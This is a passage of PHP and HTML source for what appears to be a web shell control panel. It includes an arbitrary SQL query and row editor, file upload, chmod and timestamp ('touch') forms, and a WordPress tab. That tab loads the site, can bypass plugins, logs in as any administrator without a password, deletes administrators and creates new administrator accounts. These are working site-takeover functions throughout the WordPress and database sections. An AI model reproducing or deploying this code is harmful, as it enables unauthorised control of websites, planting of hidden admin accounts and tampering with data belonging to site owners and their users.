                                <label style="display: block; margin-bottom: 5px; color: #9ca3af;">Host:</label>
                                <input type="text" name="host" class="form-input" value="<?php echo htmlspecialchars($saved_host); ?>" style="width: 100%; box-sizing: border-box;">
                            </div>
                            <div style="flex: 1;">
                                <label style="display: block; margin-bottom: 5px; color: #9ca3af;">Port:</label>
                                <input type="text" name="port" class="form-input" value="<?php echo htmlspecialchars($saved_port); ?>" style="width: 100%; box-sizing: border-box;">
                            </div>
                        </div>
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; color: #9ca3af;">Username:</label>
                            <input type="text" name="user" class="form-input" value="<?php echo htmlspecialchars($saved_user); ?>" style="width: 100%; box-sizing: border-box;">
                        </div>
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; color: #9ca3af;">Password:</label>
                            <input type="password" name="pass" class="form-input" value="" style="width: 100%; box-sizing: border-box;">
                        </div>
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; color: #9ca3af;">Database Name:</label>
                            <input type="text" name="dbname" class="form-input" value="<?php echo htmlspecialchars($saved_dbname); ?>" placeholder="optional" style="width: 100%; box-sizing: border-box;">
                        </div>
                    </div>
                    
                    <div id="db-fields-sqlite" style="display: none;">
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; color: #9ca3af;">SQLite Database File Path:</label>
                            <input type="text" name="path" class="form-input" value="<?php echo htmlspecialchars($saved_path); ?>" style="width: 100%; box-sizing: border-box;">
                            <span style="font-size: 11px; color: #6b7280; display: block; margin-top: 5px;">File will be created if it does not exist (requires directory write permissions).</span>
                        </div>
                    </div>
                    
                    <button type="submit" class="action-btn" style="width: 100%; background-color: #3b82f6; border-color: #2563eb; padding: 8px;">Connect</button>
                </form>
                <script>
                    document.addEventListener("DOMContentLoaded", function() {
                        toggleDbDriver(document.getElementById('db_driver_select').value);
                    });
                </script>
                
            <?php else: ?>
                
                <!-- DATABASE WORKSPACE -->
                <div style="display: flex; justify-content: space-between; align-items: center; background-color: #11151d; border: 1px solid #2d3748; padding: 10px 15px; border-radius: 4px; margin-bottom: 15px;">
                    <div>
                        <span style="color: #9ca3af;">Connected:</span>
                        <strong style="color: #38bdf8; font-size: 13px;">
                            <?php 
                            if ($db_conn_data['driver'] === 'sqlite') {
                                echo 'SQLite (' . htmlspecialchars(basename($db_conn_data['path'])) . ')';
                            } else {
                                $databases = ($active_tab === 'sql' ? get_db_databases($db_pdo) : []);
                                echo 'MySQL (' . htmlspecialchars($db_conn_data['host']) . ':' . htmlspecialchars($db_conn_data['port']) . ' / ';
                                if (!empty($databases)) {
                                    echo '<form method="post" style="display:inline; margin:0;">';
                                    echo '<input type="hidden" name="action" value="db_select_database">';
                                    echo '<select name="dbname" onchange="this.form.submit()" style="background:#1f2937; color:#fff; border:1px solid #4b5563; border-radius:3px; padding:2px 5px; font-size:12px; cursor:pointer;">';
                                    if (empty($db_conn_data['dbname'])) {
                                        echo '<option value="" selected>-- select database --</option>';
                                    }
                                    foreach ($databases as $db) {
                                        $selected = ($db === $db_conn_data['dbname']) ? 'selected' : '';
                                        echo '<option value="' . htmlspecialchars($db) . '" ' . $selected . '>' . htmlspecialchars($db) . '</option>';
                                    }
                                    echo '</select>';
                                    echo '</form>';
                                } else {
                                    $db_name_display = empty($db_conn_data['dbname']) ? '[no db selected]' : $db_conn_data['dbname'];
                                    echo htmlspecialchars($db_name_display);
                                }
                                echo ')';
                            }
                            ?>
                        </strong>
                    </div>
                    <form method="post" style="margin: 0;">
                        <input type="hidden" name="action" value="db_disconnect">
                        <button type="submit" class="action-btn" style="background-color: #dc2626; border-color: #b91c1c; padding: 4px 10px;">Disconnect</button>
                    </form>
                </div>
                
                <div class="sql-container">
                    <!-- SIDEBAR: TABLES OR DATABASES -->
                    <div class="sql-sidebar">
                        <?php if ($active_tab === 'sql' && $db_connected): ?>
                            <?php if ($db_conn_data['driver'] === 'mysql' && empty($db_conn_data['dbname'])): ?>
                                <div class="sql-sidebar-title">Databases</div>
                                <?php
                                $databases = get_db_databases($db_pdo);
                                if (empty($databases)):
                                ?>
                                    <div style="color: #6b7280; font-size: 11px; padding: 4px;">No databases found.</div>
                                <?php else: ?>
                                    <?php foreach ($databases as $db): ?>
                                        <form method="post" style="margin: 0; display: block;">
                                            <input type="hidden" name="action" value="db_select_database">
                                            <input type="hidden" name="dbname" value="<?php echo htmlspecialchars($db); ?>">
                                            <button type="submit" class="sql-table-item" title="Click to select database"><?php echo htmlspecialchars($db); ?></button>
                                        </form>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            <?php else: ?>
                                <div class="sql-sidebar-title">Tables</div>
                                <?php
                                $tables = get_db_tables($db_pdo, $db_conn_data['driver']);
                                if (empty($tables)):
                                ?>
                                    <div style="color: #6b7280; font-size: 11px; padding: 4px;">No tables found.</div>
                                <?php else: ?>
                                    <?php foreach ($tables as $tbl_info): 
                                        $tbl_name = $tbl_info['name'];
                                        $tbl_rows = $tbl_info['rows'];
                                    ?>
                                        <form method="post" style="margin: 0; display: block;">
                                            <input type="hidden" name="action" value="db_browse">
                                            <input type="hidden" name="table" value="<?php echo htmlspecialchars($tbl_name); ?>">
                                            <input type="hidden" name="page" value="1">
                                            <button type="submit" class="sql-table-item" title="Click to browse table">
                                                <?php echo htmlspecialchars($tbl_name); ?> <span style="color: #9ca3af; font-size: 11px;">(<?php echo $tbl_rows; ?>)</span>
                                            </button>
                                        </form>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            <?php endif; ?>
                        <?php endif; ?>
                    </div>
                    
                    <!-- MAIN WORKSPACE -->
                    <div class="sql-main">
                        <?php if ($db_error): ?>
                            <div class="db-error-box"><?php echo htmlspecialchars($db_error); ?></div>
                        <?php endif; ?>
                        
                        <?php if ($db_query_info): ?>
                            <div class="db-success-box"><?php echo htmlspecialchars($db_query_info); ?></div>
                        <?php endif; ?>
                        
                        <?php if ($db_conn_data['driver'] === 'mysql' && empty($db_conn_data['dbname'])): ?>
                            <div style="background-color: #11151d; border: 1px solid #2d3748; padding: 20px; border-radius: 4px;">
                                <h3 style="margin-top: 0; color: #fff; font-size: 16px; border-bottom: 1px solid #2d3748; padding-bottom: 10px; margin-bottom: 15px;">Select a Database</h3>
                                <p style="color: #9ca3af; font-size: 12px; margin-bottom: 15px;">No database selected. Please select one from the list below to browse tables and execute queries:</p>
                                <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px;">
                                    <?php
                                    $databases = ($active_tab === 'sql' ? get_db_databases($db_pdo) : []);
                                    if (empty($databases)):
                                    ?>
                                        <div style="color: #ef4444; font-size: 12px; padding: 10px;">No databases found.</div>
                                    <?php else: ?>
                                        <?php foreach ($databases as $db): ?>
                                            <form method="post" style="margin: 0;">
                                                <input type="hidden" name="action" value="db_select_database">
                                                <input type="hidden" name="dbname" value="<?php echo htmlspecialchars($db); ?>">
                                                <button type="submit" class="action-btn" style="width: 100%; text-align: left; background-color: #1f2937; border-color: #374151; padding: 12px; font-weight: normal; display: flex; justify-content: space-between; align-items: center; border-radius: 4px; transition: all 0.2s;">
                                                    <span style="color: #fff; font-weight: bold; font-size: 13px;"><?php echo htmlspecialchars($db); ?></span>
                                                    <span style="color: #38bdf8; font-size: 11px;">Connect &rarr;</span>
                                                </button>
                                            </form>
                                        <?php endforeach; ?>
                                    <?php endif; ?>
                                </div>
                            </div>
                        <?php else: ?>
                            <!-- QUERY EDITOR -->
                            <form method="post">
                                <input type="hidden" name="action" value="db_query">
                                
                                <div style="margin-bottom: 8px; display: flex; gap: 5px; flex-wrap: wrap; align-items: center;">
                                    <span style="color: #9ca3af; font-size: 11px; text-transform: uppercase; font-weight: bold; margin-right: 5px;">Templates:</span>
                                    <button type="button" class="action-btn" style="font-size: 11px; padding: 3px 8px;" onclick="insertSqlTemplate('SELECT * FROM tableName LIMIT 30;')">SELECT</button>
                                    <button type="button" class="action-btn" style="font-size: 11px; padding: 3px 8px;" onclick="insertSqlTemplate('INSERT INTO tableName (column1, column2) VALUES (\'value1\', \'value2\');')">INSERT</button>
                                    <button type="button" class="action-btn" style="font-size: 11px; padding: 3px 8px;" onclick="insertSqlTemplate('UPDATE tableName SET column1 = \'value1\' WHERE id = 1;')">UPDATE</button>
                                    <button type="button" class="action-btn" style="font-size: 11px; padding: 3px 8px;" onclick="insertSqlTemplate('DELETE FROM tableName WHERE id = 1;')">DELETE</button>
                                    <?php if ($db_conn_data['driver'] === 'mysql'): ?>
                                        <button type="button" class="action-btn" style="font-size: 11px; padding: 3px 8px;" onclick="insertSqlTemplate('DESCRIBE tableName;')">DESCRIBE</button>
                                    <?php else: ?>
                                        <button type="button" class="action-btn" style="font-size: 11px; padding: 3px 8px;" onclick="insertSqlTemplate('PRAGMA table_info(tableName);')">PRAGMA info</button>
                                    <?php endif; ?>
                                </div>
                                
                                <div style="margin-bottom: 10px;">
                                    <textarea name="sql" id="db-sql-editor" class="editor-textarea" style="height: 180px;" placeholder="SELECT * FROM tableName;" required><?php echo htmlspecialchars($db_sql); ?></textarea>
                                </div>
                                
                                <div>
                                    <button type="submit" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb; padding: 6px 16px;">Execute Query</button>
                                </div>
                            </form>
                            
                            <!-- RESULTS TABLE -->
                            <?php if ($db_query_results !== null): ?>
                                <div class="modal-title" style="margin-top: 10px; margin-bottom: 5px;">
                                    <?php echo ($db_active_table !== '') ? "Table Contents: " . htmlspecialchars($db_active_table) : "Query Output"; ?>
                                </div>
                                
                                <?php if ($db_active_table !== ''): ?>
                                    <!-- Pagination Toolbar -->
                                    <?php $total_pages = ceil($total_rows / $db_limit); ?>
                                    <div style="margin-bottom:12px; display:flex; justify-content:space-between; align-items:center; background:#11151d; border:1px solid #2d3748; padding:8px 12px; border-radius:4px;">
                                        <div style="display:flex; align-items:center; gap:5px;">
                                            <span style="color:#9ca3af; font-size:12px;">Page:</span>
                                            
                                            <!-- First Page [<<] -->
                                            <form method="post" style="margin:0; display:inline;">
                                                <input type="hidden" name="action" value="db_browse">
                                                <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                                <input type="hidden" name="page" value="1">
                                                <button type="submit" class="action-btn" style="padding:2px 6px; font-size:11px;" <?php echo ($db_page <= 1) ? 'disabled' : ''; ?>>&lt;&lt;</button>
                                            </form>
                                            
                                            <!-- Prev Page [<] -->
                                            <form method="post" style="margin:0; display:inline;">
                                                <input type="hidden" name="action" value="db_browse">
                                                <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                                <input type="hidden" name="page" value="<?php echo max(1, $db_page - 1); ?>">
                                                <button type="submit" class="action-btn" style="padding:2px 6px; font-size:11px;" <?php echo ($db_page <= 1) ? 'disabled' : ''; ?>>&lt;</button>
                                            </form>
                                            
                                            <!-- Page input -->
                                            <form method="post" style="margin:0; display:inline;">
                                                <input type="hidden" name="action" value="db_browse">
                                                <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                                <input type="number" name="page" value="<?php echo $db_page; ?>" min="1" max="<?php echo max(1, $total_pages); ?>" style="width: 50px; text-align: center; background: #1f2937; color: #fff; border: 1px solid #4b5563; border-radius: 4px; padding: 2px; font-size: 11px; font-weight: bold; margin: 0 2px;" onchange="this.form.submit()">
                                            </form>
                                            <span style="color:#9ca3af; font-size:12px; margin:0 5px 0 2px;">/ <?php echo max(1, $total_pages); ?></span>
                                            
                                            <!-- Next Page [>] -->
                                            <form method="post" style="margin:0; display:inline;">
                                                <input type="hidden" name="action" value="db_browse">
                                                <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                                <input type="hidden" name="page" value="<?php echo min($total_pages, $db_page + 1); ?>">
                                                <button type="submit" class="action-btn" style="padding:2px 6px; font-size:11px;" <?php echo ($db_page >= $total_pages) ? 'disabled' : ''; ?>>&gt;</button>
                                            </form>
                                            
                                            <!-- Last Page [>>] -->
                                            <form method="post" style="margin:0; display:inline;">
                                                <input type="hidden" name="action" value="db_browse">
                                                <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                                <input type="hidden" name="page" value="<?php echo max(1, $total_pages); ?>">
                                                <button type="submit" class="action-btn" style="padding:2px 6px; font-size:11px;" <?php echo ($db_page >= $total_pages) ? 'disabled' : ''; ?>>&gt;&gt;</button>
                                            </form>
                                            
                                            <span style="color:#6b7280; font-size:11px; margin-left:10px;">(Total rows: <?php echo $total_rows; ?>)</span>
                                        </div>
                                        <div>
                                            <button type="button" class="action-btn" style="background:#10b981; border-color:#059669; font-size:12px; padding:4px 10px;" onclick="openDbEditModal(null, true)">+ Add Row</button>
                                        </div>
                                    </div>
                                <?php endif; ?>

                                <?php if (empty($db_query_results)): ?>
                                    <div style="color: #9ca3af; padding: 10px; background-color: #11151d; border: 1px solid #2d3748; border-radius: 4px;">Returned empty result set (0 rows).</div>
                                <?php else: ?>
                                    <div class="db-results-container">
                                        <table class="db-results-table">
                                            <thead>
                                                <tr>
                                                    <?php if ($db_active_table !== ''): ?>
                                                        <th>Actions</th>
                                                    <?php endif; ?>
                                                    <?php foreach (array_keys($db_query_results[0]) as $col): ?>
                                                        <th><?php echo htmlspecialchars($col); ?></th>
                                                    <?php endforeach; ?>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <?php 
                                                $active_pks = [];
                                                if ($db_active_table !== '' && $active_tab === 'sql') {
                                                    $active_pks = get_table_primary_keys($db_pdo, $db_conn_data['driver'], $db_active_table);
                                                }
                                                ?>
                                                <?php foreach ($db_query_results as $row): ?>
                                                    <tr>
                                                        <?php if ($db_active_table !== ''): ?>
                                                            <td style="white-space: nowrap; width: 90px; text-align: left;">
                                                                <button type="button" class="action-btn" style="background:#3b82f6; border-color:#2563eb; padding:2px 6px; font-size:11px;" onclick="openDbEditModal(<?php echo htmlspecialchars(json_encode($row), ENT_QUOTES, 'UTF-8'); ?>, false)">Edit</button>
                                                                
                                                                <form method="post" style="display:inline; margin:0;" onsubmit="return confirm('Are you sure you want to delete this row?');">
                                                                    <input type="hidden" name="action" value="db_delete_row">
                                                                    <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                                                    <input type="hidden" name="page" value="<?php echo $db_page; ?>">
                                                                    <?php
                                                                    $row_pk_data = [];
                                                                    $pk_list = !empty($active_pks) ? $active_pks : array_keys($row);
                                                                    foreach ($pk_list as $pk) {
                                                                        $row_pk_data[$pk] = isset($row[$pk]) ? $row[$pk] : null;
                                                                    }
                                                                    ?>
                                                                    <input type="hidden" name="pk_data" value="<?php echo htmlspecialchars(json_encode($row_pk_data), ENT_QUOTES, 'UTF-8'); ?>">
                                                                    <button type="submit" class="action-btn" style="background:#ef4444; border-color:#dc2626; padding:2px 6px; font-size:11px;">Delete</button>
                                                                </form>
                                                            </td>
                                                        <?php endif; ?>
                                                        <?php foreach ($row as $val): ?>
                                                            <td title="<?php echo htmlspecialchars($val === null ? 'NULL' : strval($val)); ?>"><?php echo $val === null ? '<span style="color:#6b7280; font-style:italic;">NULL</span>' : htmlspecialchars($val); ?></td>
                                                        <?php endforeach; ?>
                                                    </tr>
                                                <?php endforeach; ?>
                                            </tbody>
                                        </table>
                                    </div>
                                    
                                    <?php if ($db_active_table !== ''): ?>
                                        <!-- Keep track of the active table primary keys for the editor script -->
                                        <script>
                                            var activeTablePks = <?php echo json_encode($active_pks); ?>;
                                        </script>
                                        <input type="hidden" id="db-active-table-name" value="<?php echo htmlspecialchars($db_active_table); ?>">
                                    <?php endif; ?>
                                <?php endif; ?>
                            <?php endif; ?>
                        <?php endif; ?>
                    </div>
                </div>
                
            <?php endif; ?>
            
            <!-- EDIT ROW MODAL -->
            <div id="db-edit-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:1000; align-items:center; justify-content:center;">
                <div style="background:#11151d; border:1px solid #374151; width:500px; max-width:90%; border-radius:6px; padding:20px; box-shadow:0 10px 25px rgba(0,0,0,0.5); display:flex; flex-direction:column; max-height:85%;">
                    <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #2d3748; padding-bottom:10px; margin-bottom:15px;">
                        <h4 id="db-edit-modal-title" style="margin:0; color:#fff; font-size:14px;">Edit Row</h4>
                        <button type="button" onclick="closeDbEditModal()" style="background:none; border:none; color:#9ca3af; font-size:20px; cursor:pointer; line-height:1;">&times;</button>
                    </div>
                    <form id="db-edit-form" method="post" style="overflow-y:auto; flex:1; padding-right:5px; margin-bottom:15px;">
                        <input type="hidden" name="action" value="db_save_row">
                        <input type="hidden" name="table" id="db-edit-table">
                        <input type="hidden" name="is_new" id="db-edit-is-new">
                        <input type="hidden" name="page" value="<?php echo $db_page; ?>">
                        <input type="hidden" name="pk_data" id="db-edit-pk-data">
                        <div id="db-edit-fields-container"></div>
                    </form>
                    <div style="display:flex; justify-content:flex-end; gap:10px; border-top:1px solid #2d3748; padding-top:10px;">
                        <button type="button" class="action-btn" style="background:#4b5563; border-color:#374151;" onclick="closeDbEditModal()">Cancel</button>
                        <button type="submit" form="db-edit-form" class="action-btn" style="background:#10b981; border-color:#059669;">Save Changes</button>
                    </div>
                </div>
            </div>
            
            <script>
                function openDbEditModal(row, isNew) {
                    var container = document.getElementById('db-edit-fields-container');
                    container.innerHTML = '';
                    
                    var tableInput = document.getElementById('db-active-table-name');
                    if (!tableInput) return;
                    
                    document.getElementById('db-edit-table').value = tableInput.value;
                    document.getElementById('db-edit-is-new').value = isNew ? '1' : '0';
                    document.getElementById('db-edit-modal-title').innerText = isNew ? 'Add New Row' : 'Edit Row';
                    
                    var pks = window.activeTablePks || [];
                    var pkData = {};
                    if (row) {
                        if (pks.length > 0) {
                            pks.forEach(function(pk) {
                                if (row[pk] !== undefined) {
                                    pkData[pk] = row[pk];
                                }
                            });
                        } else {
                            Object.keys(row).forEach(function(key) {
                                pkData[key] = row[key];
                            });
                        }
                    }
                    document.getElementById('db-edit-pk-data').value = JSON.stringify(pkData);
                    
                    var columns = Object.keys(row || {});
                    if (columns.length === 0) {
                        var headers = document.querySelectorAll('.db-results-table th');
                        headers.forEach(function(th) {
                            var colName = th.innerText.trim();
                            if (colName !== 'Actions') {
                                columns.push(colName);
                            }
                        });
                    }
                    
                    columns.forEach(function(col) {
                        var val = isNew ? '' : (row[col] !== null ? row[col] : '');
                        var isPk = pks && pks.indexOf(col) !== -1;
                        
                        var fieldDiv = document.createElement('div');
                        fieldDiv.style.marginBottom = '12px';
                        
                        var label = document.createElement('label');
                        label.style.display = 'block';
                        label.style.fontSize = '11px';
                        label.style.color = '#9ca3af';
                        label.style.textTransform = 'uppercase';
                        label.style.marginBottom = '4px';
                        label.innerText = col + (isPk ? ' (Primary Key)' : '');
                        fieldDiv.appendChild(label);
                        
                        var input;
                        if (typeof val === 'string' && val.length > 50) {
                            input = document.createElement('textarea');
                            input.className = 'editor-textarea';
                            input.style.height = '60px';
                            input.style.width = '100%';
                            input.style.boxSizing = 'border-box';
                        } else {
                            input = document.createElement('input');
                            input.type = 'text';
                            input.className = 'form-input';
                            input.style.width = '100%';
                            input.style.boxSizing = 'border-box';
                        }
                        input.name = 'fields[' + col + ']';
                        input.value = val;
                        
                        var nullDiv = document.createElement('div');
                        nullDiv.style.display = 'flex';
                        nullDiv.style.alignItems = 'center';
                        nullDiv.style.marginTop = '4px';
                        
                        var nullCheckbox = document.createElement('input');
                        nullCheckbox.type = 'checkbox';
                        nullCheckbox.name = 'nulls[' + col + ']';
                        nullCheckbox.value = '1';
                        nullCheckbox.id = 'null-' + col;
                        nullCheckbox.style.marginRight = '6px';
                        nullCheckbox.style.width = 'auto';
                        if (!isNew && row[col] === null) {
                            nullCheckbox.checked = true;
                            input.disabled = true;
                            input.style.opacity = '0.5';
                        }
                        
                        nullCheckbox.onchange = function() {
                            if (nullCheckbox.checked) {
                                input.disabled = true;
                                input.style.opacity = '0.5';
                            } else {
                                input.disabled = false;
                                input.style.opacity = '1';
                            }
                        };
                        
                        var nullLabel = document.createElement('label');
                        nullLabel.htmlFor = 'null-' + col;
                        nullLabel.style.fontSize = '11px';
                        nullLabel.style.color = '#6b7280';
                        nullLabel.style.cursor = 'pointer';
                        nullLabel.innerText = 'Set NULL';
                        
                        nullDiv.appendChild(nullCheckbox);
                        nullDiv.appendChild(nullLabel);
                        
                        fieldDiv.appendChild(input);
                        fieldDiv.appendChild(nullDiv);
                        container.appendChild(fieldDiv);
                    });
                    
                    var modal = document.getElementById('db-edit-modal');
                    modal.style.display = 'flex';
                }
                
                function closeDbEditModal() {
                    document.getElementById('db-edit-modal').style.display = 'none';
                }
            </script>
        </div>

        <!-- ================== WP TOOLS TAB ================== -->
        <div class="tab-pane pane-wp <?php echo $active_tab === 'wp' ? 'active' : ''; ?>">
            <div class="modal-title">WordPress Tools</div>
            
            <?php if (!$wp_is_valid): ?>
                <?php if (isset($GLOBALS['janus_wp_error'])): ?>
                    <div class="db-conn-box" style="max-width: 500px; margin: 0 auto 20px auto; background-color: #1a161d; border: 1px solid #ef4444; padding: 15px; border-radius: 4px; color: #f87171;">
                        <strong style="display: block; margin-bottom: 5px; color: #ef4444; font-size: 14px;">WordPress Bootstrap Error:</strong>
                        <p style="font-size: 12px; margin: 0 0 10px 0; color: #9ca3af;">A catchable error was encountered while including <code>wp-load.php</code>:</p>
                        <pre style="background: #111317; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 11px; overflow-x: auto; color: #f3f4f6; margin: 0; line-height: 1.4; border: 1px solid #2d3748;"><?php 
                            $err = $GLOBALS['janus_wp_error'];
                            if (is_object($err)) {
                                echo htmlspecialchars(get_class($err) . ": " . $err->getMessage() . "\nin " . $err->getFile() . " on line " . $err->getLine());
                            } else {
                                echo htmlspecialchars(strval($err));
                            }
                        ?></pre>
                    </div>
                <?php endif; ?>
                <div class="db-conn-box" style="max-width: 500px; margin: 0 auto; background-color: #11151d; border: 1px solid #2d3748; padding: 20px; border-radius: 4px;">
                    <form method="post">
                        <input type="hidden" name="action" value="set_wp_path">
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; font-size: 11px; color: #9ca3af; text-transform: uppercase; margin-bottom: 5px;">WordPress Root Path</label>
                            <input type="text" name="wp_path" class="form-input" value="<?php echo htmlspecialchars($wp_path !== '' ? $wp_path : $autodetect_wp_path); ?>" placeholder="e.g. C:\laragon\www\wordpress" required style="width: 100%; box-sizing: border-box;">
                        </div>
                        <div style="margin-bottom: 15px; display: flex; align-items: center;">
                            <input type="checkbox" id="wp_safe_mode" name="wp_safe_mode" value="1" <?php echo $wp_safe_mode ? 'checked' : ''; ?> style="margin-right: 10px; width: auto;">
                            <label for="wp_safe_mode" style="font-size: 12px; color: #9ca3af; cursor: pointer; user-select: none;">Enable Safe Mode (Bypass Active Plugins)</label>
                        </div>
                        <button type="submit" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb; width: 100%;">Save WordPress Path</button>
                    </form>
                </div>
            <?php else: ?>
                <div class="db-manager-layout">
                    <!-- WordPress Site Info -->
                    <div style="background-color: #11151d; border: 1px solid #2d3748; padding: 15px; border-radius: 4px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <h3 style="margin: 0; color: #fff; font-size: 16px;"><?php echo htmlspecialchars($wp_site_name !== '' ? $wp_site_name : 'WordPress Site'); ?></h3>
                                <a href="<?php echo htmlspecialchars($wp_site_url); ?>" target="_blank" style="color: #38bdf8; text-decoration: none; font-size: 12px;"><?php echo htmlspecialchars($wp_site_url); ?></a>
                            </div>
                            <div style="display: flex; gap: 10px;">
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="toggle_wp_safe_mode">
                                    <button type="submit" class="action-btn" style="background-color: <?php echo $wp_safe_mode ? '#991b1b' : '#4b5563'; ?>; border-color: <?php echo $wp_safe_mode ? '#7f1d1d' : '#374151'; ?>;">
                                        <?php echo $wp_safe_mode ? 'Safe Mode: ON (Plugins Skipped)' : 'Safe Mode: OFF'; ?>
                                    </button>
                                </form>
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="clear_wp_path">
                                    <button type="submit" class="action-btn" style="background-color: #4b5563; border-color: #374151;">Disconnect / Change Path</button>
                                </form>
                            </div>
                        </div>
                        <div style="margin-top: 10px; font-size: 12px; color: #9ca3af;">
                            <strong>WP Path:</strong> <code><?php echo htmlspecialchars($wp_path); ?></code>
                        </div>
                    </div>

                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <!-- Col 1: Manage Administrators -->
                        <div style="background-color: #11151d; border: 1px solid #2d3748; padding: 20px; border-radius: 4px; display: flex; flex-direction: column;">
                            <h4 style="margin-top: 0; color: #fff; border-bottom: 1px solid #2d3748; padding-bottom: 10px;">Manage WordPress Administrators</h4>
                            <p style="color: #9ca3af; font-size: 12px; margin-bottom: 15px;">Log in directly or delete administrator accounts from this WordPress site.</p>
                            
                            <?php if (empty($wp_admins)): ?>
                                <div style="color: #ef4444; font-size: 12px;">No administrator users found.</div>
                            <?php else: ?>
                                <div style="max-height: 250px; overflow-y: auto; border: 1px solid #2d3748; border-radius: 4px; background: #111827; flex: 1;">
                                    <table style="width: 100%; border-collapse: collapse; font-size: 12px; text-align: left;">
                                        <thead>
                                            <tr style="border-bottom: 1px solid #2d3748; background: #1f2937; color: #9ca3af;">
                                                <th style="padding: 8px;">Username</th>
                                                <th style="padding: 8px;">Email</th>
                                                <th style="padding: 8px; text-align: right;">Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($wp_admins as $admin): ?>
                                                <tr style="border-bottom: 1px solid #1f2937;">
                                                    <td style="padding: 8px; color: #fff; font-weight: bold;"><?php echo htmlspecialchars($admin['user_login']); ?></td>
                                                    <td style="padding: 8px; color: #9ca3af; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($admin['user_email']); ?>"><?php echo htmlspecialchars($admin['user_email']); ?></td>
                                                    <td style="padding: 8px; text-align: right; white-space: nowrap;">
                                                        <form method="post" style="margin: 0; display: inline;">
                                                            <input type="hidden" name="action" value="wp_login_admin">
                                                            <input type="hidden" name="user_id" value="<?php echo $admin['ID']; ?>">
                                                            <button type="submit" class="action-btn" style="background-color: #10b981; border-color: #059669; padding: 2px 6px; font-size: 11px;" title="Log in as admin">Login</button>
                                                        </form>
                                                        <form method="post" style="margin: 0; display: inline;" onsubmit="return confirm('Are you sure you want to delete administrator user \'<?php echo htmlspecialchars(addslashes($admin['user_login']), ENT_QUOTES); ?>\'?');">
                                                            <input type="hidden" name="action" value="wp_delete_admin">
                                                            <input type="hidden" name="user_id" value="<?php echo $admin['ID']; ?>">
                                                            <button type="submit" class="action-btn" style="background-color: #ef4444; border-color: #dc2626; padding: 2px 6px; font-size: 11px;" title="Delete administrator">Delete</button>
                                                        </form>
                                                    </td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                            <?php endif; ?>
                        </div>

                        <!-- Col 2: Add Admin User -->
                        <div style="background-color: #11151d; border: 1px solid #2d3748; padding: 20px; border-radius: 4px;">
                            <h4 style="margin-top: 0; color: #fff; border-bottom: 1px solid #2d3748; padding-bottom: 10px;">Add New Administrator</h4>
                            <p style="color: #9ca3af; font-size: 12px; margin-bottom: 15px;">Create a new administrator user account in this WordPress site.</p>
                            
                            <form method="post">
                                <input type="hidden" name="action" value="wp_create_admin">
                                <div style="margin-bottom: 10px;">
                                    <label style="display: block; font-size: 11px; color: #9ca3af; text-transform: uppercase; margin-bottom: 5px;">Username</label>
                                    <input type="text" name="wp_user" class="form-input" placeholder="e.g. wpadmin" required style="width: 100%; box-sizing: border-box;">
                                </div>
                                <div style="margin-bottom: 10px;">
                                    <label style="display: block; font-size: 11px; color: #9ca3af; text-transform: uppercase; margin-bottom: 5px;">Password</label>
                                    <input type="password" name="wp_pass" class="form-input" placeholder="Password" required style="width: 100%; box-sizing: border-box;">
                                </div>
                                <div style="margin-bottom: 15px;">
                                    <label style="display: block; font-size: 11px; color: #9ca3af; text-transform: uppercase; margin-bottom: 5px;">Email Address</label>
                                    <input type="email" name="wp_email" class="form-input" placeholder="email@example.com" required style="width: 100%; box-sizing: border-box;">
                                </div>
                                <button type="submit" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb; width: 100%;">Create Admin User</button>
                            </form>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
        </div>

    </div>

    <!-- UTILITY SCRIPTS (LIGHTWEIGHT EVENT TRIGGERS) -->
    <script>
        function toggleForm(id) {
            var form = document.getElementById(id);
            if (form) {
                if (form.style.display === 'none') {
                    // Close other toggled forms to keep UI simple
                    ['form-upload', 'form-newfile', 'form-newdir', 'form-rename', 'form-chmod', 'form-touch'].forEach(function(fid) {
                        var f = document.getElementById(fid);
                        if (f) f.style.display = 'none';
                    });
                    form.style.display = 'block';
                    var inp = form.querySelector('input[type="text"]');
                    if (inp) inp.focus();
                } else {
                    form.style.display = 'none';
                }
            }
        }

        function openRename(name) {
            document.getElementById('rename-old-id').value = name;
            document.getElementById('rename-old-text').innerText = name;
            document.getElementById('rename-new-input').value = name;
            
            // Close other forms and open rename
            ['form-upload', 'form-newfile', 'form-newdir', 'form-chmod', 'form-touch'].forEach(function(fid) {
                var f = document.getElementById(fid);
                if (f) f.style.display = 'none';
            });
            document.getElementById('form-rename').style.display = 'block';
            document.getElementById('rename-new-input').focus();
        }

        function closeRename() {
            document.getElementById('form-rename').style.display = 'none';
        }

        function openChmod(name, currentMode) {
            document.getElementById('chmod-item-name').value = name;
            document.getElementById('chmod-item-text').innerText = name;
